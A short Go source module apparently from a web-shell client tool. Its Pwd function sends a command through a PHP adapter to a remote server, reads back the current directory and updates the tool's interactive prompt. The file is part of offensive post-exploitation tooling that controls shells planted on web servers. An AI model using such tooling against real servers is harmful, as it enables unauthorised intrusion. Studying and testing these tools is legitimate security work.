package shellmodule

import (
	"strings"

	"github.com/eatbytes/razboy"
	"github.com/eatbytes/razboy/adapter/phpadapter"
	"github.com/eatbytes/razboy/core"
	"github.com/eatbytes/razboynik/services/kernel"
)

func Pwd(kc *kernel.KernelCmd, request *core.REQUEST) (*kernel.KernelCmd, error) {
	var (
		rzRes      *razboy.RazResponse
		pwd, scope string
		err        error
	)

	request.Type = "SHELL"
	request.SHLc.Scope = kc.GetScope()

	pwd = phpadapter.CreateCMD(kc.GetRaw(), request.SHLc) + phpadapter.CreateAnswer(request)
	request.Action = pwd

	rzRes, err = razboy.Send(request)
	kc.SetResult(rzRes)

	if err != nil {
		return kc, err
	}

	scope = strings.TrimSpace(kc.GetResult())

	if scope != "" {
		kc.SetScope(scope)
		kernel.Boot().UpdatePrompt(request.SRVc.Url, scope)
	}

	return kc, nil
}
